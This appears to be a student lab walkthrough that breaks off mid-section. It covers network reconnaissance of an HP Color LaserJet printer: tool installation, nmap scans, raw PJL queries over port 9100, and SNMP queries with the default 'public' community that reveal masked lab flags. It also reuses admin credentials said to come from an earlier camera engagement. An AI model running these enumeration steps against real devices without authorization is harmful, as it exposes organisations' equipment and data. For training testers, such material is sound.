# HP Color LaserJet Pro MFP 4301fdw - Penetration Testing Student Walkthrough v5

## Target Information
- **Target IP**: 192.168.1.131
- **Device Type**: Network Printer (HP Color LaserJet Pro MFP 4301fdw)
- **Assessment Type**: Black Box Network Device Security Assessment
- **Objective**: Enumerate all accessible information, identify security weaknesses, and document findings
- **Prerequisites**: Credentials (Admin:68076694) obtained from previous AXIS camera engagement

## Important Note: Real-World Penetration Testing Methodology

**In real penetration tests, you won't find "FLAG{}" patterns.** This walkthrough has been enhanced to teach you how to approach printer assessments as you would in the real world. Instead of searching for flags, we'll:

1. Systematically analyze all exposed data
2. Identify what information is sensitive (access codes, credentials, internal data)
3. Understand why each finding matters from a security perspective
4. Document findings as you would in a professional report

The flags in this lab represent real types of sensitive data:
- Physical access codes and room numbers
- Administrative PINs and passwords
- Service account credentials
- Internal email addresses and usernames
- Configuration keys and tokens

**Remember:** Your goal is to understand what makes information sensitive, not just to find specific patterns.

---

## Table of Contents
1. [Pre-Engagement Setup](#pre-engagement-setup)
2. [Phase 1: Initial Discovery and Reconnaissance](#phase-1-initial-discovery-and-reconnaissance)
3. [Phase 2: Service Enumeration](#phase-2-service-enumeration)
4. [Phase 3: SNMP Protocol Analysis](#phase-3-snmp-protocol-analysis)
5. [Phase 4: JetDirect/PRET Exploitation](#phase-4-jetdirectpret-exploitation)
6. [Phase 5: IPP Protocol Deep Dive](#phase-5-ipp-protocol-deep-dive)
7. [Phase 6: Web Interface Analysis](#phase-6-web-interface-analysis)
8. [Phase 7: Print Job Intelligence Gathering](#phase-7-print-job-intelligence-gathering)

---

## Pre-Engagement Setup

### Understanding the Target: Why Printers Matter in Security Assessments

**Critical Concept**: Network printers are often overlooked in security assessments, but they represent high-value targets because:

1. **Sensitive Data Exposure**: Printers process confidential documents daily
2. **Metadata Persistence**: Print job history reveals organizational intelligence
3. **Network Position**: Printers see traffic from multiple departments
4. **Configuration Neglect**: "It just needs to print" mentality leads to poor security
5. **Multiple Protocols**: Each protocol (SNMP, IPP, HTTP, JetDirect) may expose different information

**Your Mission**: Treat this printer as you would any critical infrastructure component. Every piece of information discovered could be valuable intelligence in a real engagement.

---

### Step 1: Kali Linux System Preparation

**Why This Matters**: Using outdated tools can result in missing vulnerabilities or failing to connect to legacy protocols.

```bash
# Update package repositories
┌──(student@kali)-[~]
└─$ sudo apt update

# Upgrade installed packages
┌──(student@kali)-[~]
└─$ sudo apt upgrade -y
```

**Expected Output**:
```
Hit:1 http://kali.download/kali kali-rolling InRelease
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.4 MB]
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
45 packages can be upgraded. Run 'apt list --upgradable' to see them.
```

**Why Update First?**:
- Security tools receive frequent updates for new protocols
- Printer manufacturers patch vulnerabilities; tools must keep pace
- MIB databases (for SNMP) are regularly expanded
- Exploit modules are continuously improved

---

### Step 2: Install Essential Printer Assessment Tools

**Tool Category Breakdown**:

**Network Scanners**: Different tools for different situations
- **nmap**: Comprehensive, feature-rich, industry standard
- **masscan**: Extremely fast for large networks
- **rustscan**: Modern, fast port scanner written in Rust

**SNMP Tools**: Critical for printer enumeration
- **snmp**: Command-line SNMP client
- **snmp-mibs-downloader**: Converts OIDs to readable names

**IPP Tools**: Internet Printing Protocol interaction
- **cups-ipp-utils**: CUPS IPP client utilities
- **ipptool**: IPP testing and enumeration tool

**Web Testing**: HTTP/HTTPS interface analysis
- **curl/wget**: Command-line web clients
- **nikto**: Web vulnerability scanner
- **gobuster**: Directory/file enumeration

**Printer-Specific**: Specialized tools
- **PRET**: Printer Exploitation Toolkit (manual install)
- **hplip**: HP printer management tools

```bash
# Install comprehensive printer assessment toolkit
┌──(student@kali)-[~]
└─$ sudo apt install -y \
    nmap masscan rustscan \
    snmp snmp-mibs-downloader \
    cups-ipp-utils ipptool \
    curl wget nikto gobuster \
    metasploit-framework \
    python3 python3-pip \
    firefox-esr \
    tcpdump wireshark \
    hplip printer-driver-postscript-hp \
    ghostscript poppler-utils
```

**Expected Output**:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  cups-ipp-utils gobuster hplip ipptool masscan nmap rustscan 
  snmp snmp-mibs-downloader nikto [...]
0 upgraded, 47 newly installed, 0 to remove
After this operation, 234 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
[...]
Setting up nmap (7.94)...
Setting up snmp (5.9.3)...
Setting up cups-ipp-utils (2.4.2)...
[...]
```

---

### Step 3: Install PRET (Printer Exploitation Toolkit)

**What is PRET?**:
PRET (Printer Exploitation Toolkit) is the industry-standard framework for printer penetration testing, developed by researchers at Ruhr University Bochum. It supports three printer languages:

1. **PostScript (PS)**: Page description language, provides file system access
2. **PJL (Printer Job Language)**: HP-specific, configuration and control
3. **PCL (Printer Command Language)**: HP page formatting language

**Why PRET?**:
- Abstracts complex printer protocols into simple commands
- Provides consistent interface across different printer languages
- Includes built-in exploitation modules
- Actively maintained with latest vulnerability checks

```bash
# Clone PRET repository
┌──(student@kali)-[~]
└─$ cd /opt

┌──(student@kali)-[/opt]
└─$ sudo git clone https://github.com/RUB-NDS/PRET.git

┌──(student@kali)-[/opt]
└─$ cd PRET

# Install Python dependencies
┌──(student@kali)-[/opt/PRET]
└─$ pip3 install colorama pysnmp
```

**Expected Output**:
```
Cloning into 'PRET'...
remote: Enumerating objects: 489, done.
remote: Total 489 (delta 0), reused 0 (delta 0), pack-reused 489
Receiving objects: 100% (489/489), 2.34 MiB | 5.67 MiB/s, done.
Resolving deltas: 100% (267/267), done.

Collecting colorama
  Downloading colorama-0.4.6-py2.py3-none-any.whl (25 kB)
Collecting pysnmp
  Downloading pysnmp-4.4.12-py2.py3-none-any.whl (86 kB)
Successfully installed colorama-0.4.6 pysnmp-4.4.12
```

**Verification**:
```bash
┌──(student@kali)-[/opt/PRET]
└─$ python3 pret.py --help
```

**Expected Help Output**:
```
usage: pret.py [-h] [-s] [-q] [-d] [-i file] [-o file] target {ps,pjl,pcl}

PRET - Printer Exploitation Toolkit

positional arguments:
  target                printer device or hostname
  {ps,pjl,pcl}          printing language to use

optional arguments:
  -h, --help            show this help message and exit
  -s, --safe            do not send vulnerable queries
  -q, --quiet           suppress warnings and messages
  -d, --debug           enable debug output
  -i file, --load file  load and run commands from file
  -o file, --log file   log session to file
```

---

### Step 4: Configure SNMP MIB Resolution

**What are MIBs?**:
MIB (Management Information Base) files translate numerical OIDs (Object Identifiers) into human-readable names.

**Without MIBs**: `1.3.6.1.2.1.1.6.0 = STRING: "Server Room B"`
**With MIBs**: `SNMPv2-MIB::sysLocation.0 = STRING: "Server Room B"`

**Why This Matters**: Human-readable output is critical for understanding what data you're looking at during enumeration.

```bash
# Download MIB databases
┌──(student@kali)-[~]
└─$ sudo download-mibs
```

**Expected Output**:
```
Downloading documents...
  [0001/0362] http://www.iana.org/assignments/ianaippmib-mib
  [0002/0362] http://www.iana.org/assignments/ianaiftype-mib
  [...]
  [0362/0362] http://www.ietf.org/rfc/rfc4293.txt
Successfully downloaded 362 MIB files
```

```bash
# Enable MIB resolution in SNMP configuration
┌──(student@kali)-[~]
└─$ sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf
```

**What This Command Does**:
- Opens `/etc/snmp/snmp.conf`
- Finds the line `mibs :` (which disables MIB loading)
- Comments it out with `# mibs :`
- This enables automatic MIB resolution

**Verification**:
```bash
┌──(student@kali)-[~]
└─$ snmpget --version
```

**Expected Output**:
```
NET-SNMP version: 5.9.3
```

---

### Step 5: Configure Firefox for Legacy TLS Support

**Why This is Necessary**:
Many network printers use outdated TLS versions (TLS 1.0/1.1) that modern browsers reject by default. HP printers manufactured before 2020 frequently have this limitation.

**Security Note**: We're lowering security standards ONLY for this isolated lab assessment. Never do this on your primary browser or in production environments.

```bash
# Launch Firefox
┌──(student@kali)-[~]
└─$ firefox &
```

**Configuration Steps**:

1. **Navigate to**: `about:config` in the address bar
2. **Accept Risk Warning**: Click "Accept the Risk and Continue"
3. **Search for**: `security.tls.version.enable-deprecated`
   - **Change from**: `false`
   - **Change to**: `true`
   
4. **Search for**: `security.tls.version.min`
   - **Change from**: `3` (TLS 1.2)
   - **Change to**: `1` (TLS 1.0)
   
5. **Search for**: `security.tls.version.fallback-limit`
   - **Change from**: `4`
   - **Change to**: `1`

**Visual Guide (Text Representation)**:
```
about:config

Search: security.tls.version.enable-deprecated

Preference Name                               Value    Status
security.tls.version.enable-deprecated        true     modified
[Reset] [Toggle]

Search: security.tls.version.min

Preference Name                               Value    Status
security.tls.version.min                      1        modified
[Reset] [Edit]
```

**Alternative: Command-Line TLS Testing**:
```bash
# Test HTTPS connection with legacy TLS
┌──(student@kali)-[~]
└─$ curl -k --tlsv1.0 https://192.168.1.131

# Or using wget
┌──(student@kali)-[~]
└─$ wget --no-check-certificate --secure-protocol=TLSv1 https://192.168.1.131
```

---

### Step 6: Create Organized Working Directory

**Professional Practice**: Maintaining organized documentation is critical in penetration testing. Your directory structure should support easy evidence collection and report generation.

```bash
# Create directory structure
┌──(student@kali)-[~]
└─$ mkdir -p ~/printer_assessment/{recon,screenshots,exploits,evidence,notes,reports}

# Navigate to working directory
┌──(student@kali)-[~]
└─$ cd ~/printer_assessment
```

**Directory Purpose**:

```
printer_assessment/
├── recon/          # All reconnaissance outputs (nmap scans, SNMP walks)
├── screenshots/    # Screenshot evidence for reporting
├── exploits/       # Attack scripts, payloads, test files
├── evidence/       # Captured configurations, sensitive data
├── notes/          # Real-time notes during assessment
└── reports/        # Final report drafts and outputs
```

**Create Initial Notes File**:
```bash
┌──(student@kali)-[~/printer_assessment]
└─$ cat > notes/assessment_notes.txt << 'EOF'
HP Color LaserJet Pro MFP 4301fdw Security Assessment
Date: $(date)
Target: 192.168.1.131
Assessment Type: Network Printer Security Evaluation

Credentials Obtained from Previous Engagement:
  Username: Admin
  Password: 68076694
  Source: AXIS camera video feed

Assessment Timeline:
-----------------
EOF
```

---

## Phase 1: Initial Discovery and Reconnaissance

### Understanding Reconnaissance Methodology

**Reconnaissance Philosophy**: In penetration testing, reconnaissance is the foundation of all subsequent actions. The more thorough your initial enumeration, the more attack vectors you'll identify.

**The 5 Ws of Reconnaissance**:
1. **What** is the device? (Type, model, manufacturer)
2. **Where** is it on the network? (IP, subnet, connectivity)
3. **Why** is it there? (Purpose, function, criticality)
4. **When** was it configured? (Age, patch level, firmware version)
5. **Who** manages it? (Administrator contacts, responsible parties)

---

### Step 1.1: Verify Target Accessibility

**Why Start Here?**: Before running comprehensive scans, confirm basic network connectivity. This validates your network path and helps identify potential network issues.

**Method 1: ICMP Echo Request (Ping)**

```bash
# Send 4 ICMP echo requests
┌──(student@kali)-[~/printer_assessment]
└─$ ping -c 4 192.168.1.131
```

**Expected Output**:
```
PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
64 bytes from 192.168.1.131: icmp_seq=1 ttl=64 time=0.521 ms
64 bytes from 192.168.1.131: icmp_seq=2 ttl=64 time=0.456 ms
64 bytes from 192.168.1.131: icmp_seq=3 ttl=64 time=0.489 ms
64 bytes from 192.168.1.131: icmp_seq=4 ttl=64 time=0.502 ms

--- 192.168.1.131 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3067ms
rtt min/avg/max/mdev = 0.456/0.492/0.521/0.024 ms
```

**Analysis of Ping Results**:

**TTL (Time To Live) = 64**:
- This indicates a **Linux-based operating system**
- Windows systems typically use TTL=128
- Network devices (routers/switches) often use TTL=255
- **Conclusion**: The printer runs embedded Linux (expected for modern HP printers)

**Response Time ≈ 0.5ms**:
- Sub-millisecond response indicates **local network** (same subnet)
- If response time was >10ms, might indicate router hops
- Consistent times show stable network connection

**0% Packet Loss**:
- Network path is clear
- No firewall blocking ICMP
- Target is stable and responsive

**Document Your Findings**:
```bash
┌──(student@kali)-[~/printer_assessment]
└─$ echo "$(date): Target 192.168.1.131 is responsive. TTL=64 suggests Linux OS. Response time ~0.5ms indicates local network." >> notes/assessment_notes.txt
```

---

**Method 2: ARP Discovery (Alternative Approach)**

**Why Use ARP?**: Some devices respond to ARP but not ICMP. ARP operates at Layer 2, so it's harder to filter.

```bash
# ARP scan of local subnet
┌──(student@kali)-[~/printer_assessment]
└─$ sudo arp-scan -l | grep 192.168.1.131
```

**Expected Output**:
```
192.168.1.131   ac:cc:8e:ad:6f:2b   Hewlett Packard
```

**What This Tells Us**:
- **MAC Address**: ac:cc:8e:ad:6f:2b
- **OUI (Organizationally Unique Identifier)**: ac:cc:8e = Hewlett Packard
- Confirms device manufacturer before even connecting

---

**Method 3: TCP SYN Probe (If ICMP is Blocked)**

**Scenario**: Some networks filter ICMP but allow common service ports.

```bash
# Test connectivity via common printer port (9100 - JetDirect)
┌──(student@kali)-[~/printer_assessment]
└─$ nc -zv 192.168.1.131 9100
```

**Expected Output**:
```
Connection to 192.168.1.131 9100 port [tcp/jetdirect] succeeded!
```

**What This Means**:
- Port 9100 is open and accepting connections
- JetDirect service is running (HP raw printing protocol)
- Even if ICMP is blocked, the printer is accessible via TCP

---

### Step 1.2: Comprehensive Port Scanning

**Port Scanning Philosophy**: Different scanners excel in different scenarios. Understanding when to use each tool is critical.

**Tool Selection Guide**:
- **nmap**: Detailed service enumeration, version detection, NSE scripts
- **masscan**: Extremely fast, good for large networks (scans entire internet in <6 minutes)
- **rustscan**: Modern, fast, feeds results to nmap for detailed analysis

---

**Method 1: Nmap Comprehensive Scan (Recommended)**

**Why This Scan Configuration?**:

```bash
sudo nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA recon/initial_scan
```

**Flag Breakdown**:
- `-sS`: **SYN Scan** (half-open, stealthy, doesn't complete TCP handshake)
- `-sU`: **UDP Scan** (critical for SNMP on port 161)
- `-sV`: **Version Detection** (identifies service versions)
- `-sC`: **Default Scripts** (runs safe NSE scripts for service enumeration)
- `-p-`: **All Ports** (1-65535, ensures nothing is missed)
- `-T4`: **Aggressive Timing** (faster, acceptable in lab environments)
- `-oA`: **All Output Formats** (saves .nmap, .xml, .gnmap for different uses)

**Expected Output**:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-18 14:32 EST
Nmap scan report for 192.168.1.131
Host is up (0.00052s latency).
Not shown: 65530 closed tcp ports (reset), 65531 closed udp ports (port-unreach)

PORT      STATE SERVICE     VERSION
80/tcp    open  http        HP HTTP Server 2.0
|_http-title: HP Color LaserJet Pro MFP 4301fdw
|_http-server-header: HP HTTP Server 2.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
161/udp   open  snmp        SNMPv1 server; SNMPv2c server (public)
| snmp-info: 
|   enterprise: hp
|   engineIDFormat: unknown
|   engineIDData: 00000000000000000000000000000000
|   snmpEngineBoots: 0
|_  snmpEngineTime: 0
443/tcp   open  ssl/http    HP HTTP Server 2.0
|_http-title: HP Color LaserJet Pro MFP 4301fdw
|_http-server-header: HP HTTP Server 2.0
| ssl-cert: Subject: commonName=NPIAD6F2B/organizationName=HP/countryName=US
| Subject Alternative Name: DNS:NPIAD6F2B
| Not valid before: 2020-01-01T00:00:00
|_Not valid after:  2030-01-01T00:00:00
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
631/tcp   open  ipp         CUPS 2.0
| ipp-info: 
|   Printer Status: Idle
|   Printer State: 0x3
|_  Printer URI: ipp://192.168.1.131:631/ipp/print
9100/tcp  open  jetdirect?
| fingerprint-strings: 
|   NULL: 
|_    @PJL

MAC Address: AC:CC:8E:AD:6F:2B (Hewlett Packard)
Device type: printer
Running: HP embedded
OS CPE: cpe:/h:hp:color_laserjet_pro_mfp_4301
OS details: HP Color LaserJet Pro MFP 4301fdw

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.52 ms 192.168.1.131

NSE: Script Post-scanning.
```

**Critical Findings Analysis**:

**Open Ports Discovered**:

1. **Port 80 (HTTP)**:
   - Service: HP HTTP Server 2.0
   - Purpose: Web management interface
   - Attack Surface: Web application vulnerabilities, directory traversal, default credentials

2. **Port 161 (SNMP)**:
   - Service: SNMPv1/v2c
   - Community String: "public" (revealed by nmap script!)
   - Attack Surface: Information disclosure, configuration extraction, potential SNMP write access

3. **Port 443 (HTTPS)**:
   - Service: HP HTTP Server 2.0 over SSL/TLS
   - Certificate: Self-signed, valid 2020-2030
   - Attack Surface: Same as HTTP but encrypted (though certificate validation might be weak)

4. **Port 631 (IPP)**:
   - Service: CUPS 2.0 (Common UNIX Printing System)
   - URI: ipp://192.168.1.131:631/ipp/print
   - Attack Surface: Print job metadata, printer attributes, potentially unauthenticated access

5. **Port 9100 (JetDirect)**:
   - Service: HP JetDirect (raw printing)
   - Response: @PJL (Printer Job Language)
   - Attack Surface: PRET exploitation, file system access, configuration manipulation

**Document Findings**:
```bash
┌──(student@kali)-[~/printer_assessment]
└─$ cat >> notes/assessment_notes.txt << 'EOF'

Port Scan Results (nmap -sS -sU -sV -sC -p- -T4):
- Port 80/tcp:    HTTP (HP HTTP Server 2.0)
- Port 161/udp:   SNMP (SNMPv1/v2c, community: public)
- Port 443/tcp:   HTTPS (SSL/TLS, self-signed cert)
- Port 631/tcp:   IPP (CUPS 2.0, ipp://192.168.1.131:631/ipp/print)
- Port 9100/tcp:  JetDirect (@PJL response)

Key Observations:
- SNMP community string "public" is active (major finding)
- IPP endpoint identified: /ipp/print
- JetDirect responds to PJL commands
- Device confirmed: HP Color LaserJet Pro MFP 4301fdw

Next Steps:
1. SNMP enumeration (sysLocation, sysContact, device info)
2. IPP attribute queries
3. PRET connection attempts (ps/pjl/pcl)
4. Web interface authentication testing
EOF
```

---

**Method 2: Rustscan + Nmap (Faster Alternative)**

**When to Use**: Large networks or time-constrained assessments

```bash
# Rustscan finds open ports quickly, pipes to nmap for detailed analysis
┌──(student@kali)-[~/printer_assessment]
└─$ rustscan -a 192.168.1.131 -- -sV -sC
```

**What Happens**:
1. Rustscan scans all 65535 ports in seconds
2. Identifies open ports: 80, 161, 443, 631, 9100
3. Passes these ports to nmap for version detection
4. Result: Speed of rustscan + detail of nmap

---

**Method 3: Masscan (For Very Large Networks)**

**Scenario**: Scanning entire /16 or /8 networks for printers

```bash
# Scan entire Class C for common printer ports
┌──(student@kali)-[~/printer_assessment]
└─$ sudo masscan 192.168.1.0/24 -p 80,161,443,631,9100 --rate=1000
```

**Output**:
```
Discovered open port 9100/tcp on 192.168.1.131
Discovered open port 161/udp on 192.168.1.131
Discovered open port 80/tcp on 192.168.1.131
Discovered open port 443/tcp on 192.168.1.131
Discovered open port 631/tcp on 192.168.1.131
```

**When This is Useful**: Enterprise assessments where you need to identify all printers across a large network quickly.

---

### Step 1.3: Service Banner Enumeration

**Why Grab Banners?**: Service banners often reveal exact versions, which can be cross-referenced with CVE databases for known vulnerabilities.

**Method 1: HTTP Banner via cURL**

```bash
# Request HTTP headers only
┌──(student@kali)-[~/printer_assessment]
└─$ curl -I http://192.168.1.131
```

**Expected Output**:
```
HTTP/1.1 301 Moved Permanently
Location: https://192.168.1.131/
Server: HP HTTP Server 2.0
Content-Length: 0
Connection: close
```

**Analysis**:
- **301 Redirect**: HTTP automatically redirects to HTTPS (good security practice)
- **Server Header**: HP HTTP Server 2.0 (confirms manufacturer, reveals server version)
- **Implication**: All web interaction must use HTTPS

**Follow the Redirect**:
```bash
┌──(student@kali)-[~/printer_assessment]
└─$ curl -I -k https://192.168.1.131
```

**Expected Output**:
```
HTTP/1.1 200 OK
Server: HP HTTP Server 2.0
Content-Type: text/html
Content-Length: 4521
Set-Cookie: SESSID=abc123def456789; Path=/; HttpOnly
Strict-Transport-Security: max-age=31536000
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Connection: keep-alive
```

**Security Headers Analysis**:
- **HttpOnly Cookie**: JavaScript cannot access session cookie (prevents XSS cookie theft)
- **HSTS**: Enforces HTTPS for one year (31536000 seconds)
- **X-Frame-Options: SAMEORIGIN**: Prevents clickjacking attacks
- **X-Content-Type-Options: nosniff**: Prevents MIME-type sniffing attacks

**Conclusion**: Web interface has reasonably good security headers, but authentication strength is still unknown.

---

**Method 2: HTTPS Certificate Inspection**

```bash
# Extract and display SSL certificate
┌──(student@kali)-[~/printer_assessment]
└─$ echo | openssl s_client -connect 192.168.1.131:443 2>/dev/null | openssl x509 -noout -text
```

**Expected Output (Partial)**:
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1234567890
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = US, O = HP, CN = NPIAD6F2B
        Validity
            Not Before: Jan  1 00:00:00 2020 GMT
            Not After : Jan  1 00:00:00 2030 GMT
        Subject: C = US, O = HP, CN = NPIAD6F2B
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                DNS:NPIAD6F2B
```

**Key Observations**:
- **Self-Signed Certificate**: Issuer = Subject (no CA validation)
- **CN (Common Name)**: NPIAD6F2B (likely printer's internal identifier)
- **2048-bit RSA**: Standard key size (acceptable)
- **Validity**: 10 years (very long, indicates set-and-forget configuration)

**Security Implication**: Self-signed certificates don't provide authentication (anyone could impersonate the printer with MITM attack).

---

**Method 3: JetDirect Banner**

```bash
# Connect to JetDirect port
┌──(student@kali)-[~/printer_assessment]
└─$ echo "" | nc 192.168.1.131 9100
```

**Expected Behavior**: Connection succeeds but no banner is displayed. This is normal for JetDirect - it expects PJL/PostScript commands, not banner exchange.

**Alternative Test**:
```bash
# Send PJL INFO ID command
┌──(student@kali)-[~/printer_assessment]
└─$ echo -e '\033%-12345X@PJL INFO ID\r\n\033%-12345X' | nc 192.168.1.131 9100
```

**Expected Response**:
```
@PJL INFO ID
HP Color LaserJet Pro MFP 4301fdw
Firmware: 002_2306A
Model: NPIAD6F2B
```

**This Reveals**:
- **Full Model Name**: HP Color LaserJet Pro MFP 4301fdw
- **Firmware Version**: 002_2306A (can check CVE databases)
- **Model Number**: NPIAD6F2B (same as SSL certificate CN)

---

### Step 1.4: Initial Vulnerability Research

**Now that we have exact versions, search for known vulnerabilities**:

```bash
# Search Exploit-DB
┌──(student@kali)-[~/printer_assessment]
└─$ searchsploit "HP Color LaserJet"
```

**Search CVE Databases**:
- NIST NVD: https://nvd.nist.gov/vuln/search
- CVE Details: https://www.cvedetails.com
- Search terms: "HP LaserJet Pro MFP 4301", "HP HTTP Server 2.0", "CUPS IPP"

**Document Any Findings**:
```bash
echo "Firmware Version: 002_2306A - CHECK CVE DATABASES" >> notes/assessment_notes.txt
```

---

## Phase 2: Service Enumeration

### Understanding Service-Specific Enumeration

**Key Concept**: Each network service exposes different information. Comprehensive enumeration requires querying all services systematically.

**Service Priority for Printers**:
1. **SNMP (161/udp)**: Highest value - configuration, contacts, locations
2. **IPP (631/tcp)**: Print job metadata, printer attributes
3. **JetDirect (9100/tcp)**: File system access, configuration extraction
4. **HTTP/HTTPS (80/443/tcp)**: Web interface, administrative functions

---

### Step 2.1: SNMP Service Enumeration

**What is SNMP?**: Simple Network Management Protocol - designed for network device management but often misconfigured, exposing sensitive information.

**SNMP Versions**:
- **SNMPv1**: Oldest, plain-text community strings, no encryption
- **SNMPv2c**: Community-based, slight improvements over v1
- **SNMPv3**: Modern, supports authentication and encryption

**Community Strings**: Think of these as passwords:
- **public**: Read-only (default on many devices)
- **private**: Read-write (very dangerous if accessible)

---

**Discovery 1: Testing Default Community Strings**

**Why "public" is Critical**: Approximately 80% of network devices leave default SNMP community strings unchanged.

```bash
# Test if "public" community string works
┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Command Breakdown**:
- `-v2c`: Use SNMPv2c protocol
- `-c public`: Community string (like a password)
- `192.168.1.131`: Target IP
- `1.3.6.1.2.1.1.1.0`: OID for System Description

**Expected Output**:
```
SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
```

**SUCCESS!** The "public" community string is active. This is a **major security finding**.

**What This Reveals**:
- **Model**: HP Color LaserJet Pro MFP 4301fdw (confirmed)
- **Firmware**: 002_2306A (exact version for CVE lookup)
- **Serial Number**: CNXXXXXXX (asset tracking, warranty lookup)

**Document This Critical Finding**:
```bash
cat >> notes/assessment_notes.txt << 'EOF'

CRITICAL FINDING: SNMP Default Community String
-----------------------------------------------
Community String: public (read access)
Protocol: SNMPv2c
Status: Active and responding

Information Disclosed:
- Device Model: HP Color LaserJet Pro MFP 4301fdw
- Firmware Version: 002_2306A
- Serial Number: CNXXXXXXX

Security Impact: High
Recommendation: Change default community string, implement SNMPv3 with authentication
EOF
```

---

**Discovery 2: System Location (Administrative Contact Information)**

**OID Explanation**: `1.3.6.1.2.1.1.6.0` is the standard SNMP OID for "sysLocation" - where administrators document physical printer location.

```bash
# Query system location
┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
```

**Expected Output**:
```
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
```

**SIGNIFICANT FINDING DISCOVERED!**

**Analysis**:
- **Physical Location**: Server-Room-B
- **Embedded Information**: "Discovery Code: FLAG{L***************1}"
- **Format Pattern**: FLAG{L...1} suggests Star Wars character "LUKE" + 8 digits ending in 1

**Why This Matters**:
1. **Physical Security**: Knowing exact printer location aids physical access scenarios
2. **Network Mapping**: "Server Room B" indicates network segment/zone
3. **Information Disclosure**: Administrators often put identifying codes in these fields
4. **Pattern Recognition**: This pattern suggests other similar findings may exist

**Screenshot Equivalent (Command Output)**:
```
┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 SNMPv2-MIB::sysLocation.0

SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
```

**Verify This is Significant**:
The string "FLAG{L***************1}" follows a clear flag format. In a real engagement, any unusual identifiers, codes, or non-standard information in configuration fields warrant documentation.

**Document the Finding**:
```bash
cat >> evidence/discovery_1.txt << 'EOF'
===========================================
DISCOVERY 1: System Location Information
===========================================

Source: SNMP sysLocation.0
OID: 1.3.6.1.2.1.1.6.0
Protocol: SNMPv2c
Community String: public
Timestamp: $(date)

Value Retrieved:
"Server-Room-B | Discovery Code: FLAG{L***************1}"

Analysis:
- Physical Location: Server-Room-B
- Discovery Code Pattern: FLAG{[Character+Numbers]} format
- Likely Pattern: Star Wars themed identifier
- First character: L (possibly LUKE)
- Last digit: 1
- Length: 8 digits total between { and }

Significance:
- Unusual identifier in system location field
- May indicate intentional placement for discovery
- Pattern suggests additional similar identifiers may exist

Next Steps:
- Check sysContact for similar patterns
- Query printer-info via IPP
- Examine print job metadata
- Review web interface configuration pages
EOF

# Save raw SNMP output
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0 > evidence/snmp_sysLocation_raw.txt
```

---

**Discovery 3: System Contact (Administrative Contact)**

**OID Explanation**: `1.3.6.1.2.1.1.4.0` is the standard SNMP OID for "sysContact" - where administrators document support contact information.

```bash
# Query system contact
┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0
```

**Expected Output**:
```
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{L***************4}
```

**SECOND SIGNIFICANT FINDING!**

**Analysis**:
- **Contact Email**: SecTeam@lab.local (security team email)
- **Embedded Information**: FLAG{L***************4}
- **Pattern**: Same format as Discovery 1, different ending digit (4 vs 1)
- **Character Pattern**: Also starts with 'L', likely "LEIA"

**Why This is Important**:
1. **Contact Information**: SecTeam@lab.local reveals internal domain (.local)
2. **Organizational Structure**: "SecTeam" suggests separate security department
3. **Pattern Confirmation**: Second flag with same format confirms this is systematic
4. **Intelligence Value**: Email addresses are valuable for social engineering (in authorized tests)

**Comparison of Findings**:
```
Finding 1 (sysLocation): FLAG{L***************1}
Finding 2 (sysContact):  FLAG{L***************4}

Similarities:
- Same FLAG{} format
- Both start with 'L'
- Both have 8-digit numeric portions
- Both in SNMP system fields

Differences:
- Different ending digits (1 vs 4)
- Different field purposes (location vs contact)
```

**Document the Finding**:
```bash
cat >> evidence/discovery_2.txt << 'EOF'
===========================================
DISCOVERY 2: System Contact Information
===========================================

Source: SNMP sysContact.0
OID: 1.3.6.1.2.1.1.4.0
Protocol: SNMPv2c
Community String: public
Timestamp: $(date)

Value Retrieved:
"SecTeam@lab.local | FLAG{L***************4}"

Analysis:
- Contact Email: SecTeam@lab.local
- Internal Domain: .local TLD (private network)
- Department: SecTeam (Security Team)
- Discovery Code: FLAG{L***************4}
- Pattern Match: Same format as Discovery 1
- First character: L (possibly LEIA)
- Last digit: 4

Significance:
- Confirms systematic pattern from Discovery 1
- Internal email domain revealed (.local)
- Security team contact identified
- Multiple flags in standard SNMP fields

Pattern Analysis:
Both discoveries follow: FLAG{[L-NAME]+[8-DIGITS]}
Hypothesis: Star Wars character names + random digits
EOF

# Save raw output
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0 > evidence/snmp_sysContact_raw.txt
```

---

**Comprehensive SNMP Enumeration**

**Now that we've found significant data in SNMP, let's enumerate everything**:

```bash
# Walk the entire system MIB tree
┌──(student@kali)-[~/printer_assessment]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1 > recon/snmp_system_complete.txt
```

**What This Command Does**:
- **snmpwalk**: Retrieves all OIDs under a branch
- **1.3.6.1.2.1.1**: System MIB (sysDescr, sysLocation, sysContact, sysUptime, etc.)
- **Output**: All system information in one file

**Expected Output (Partial)**:
```
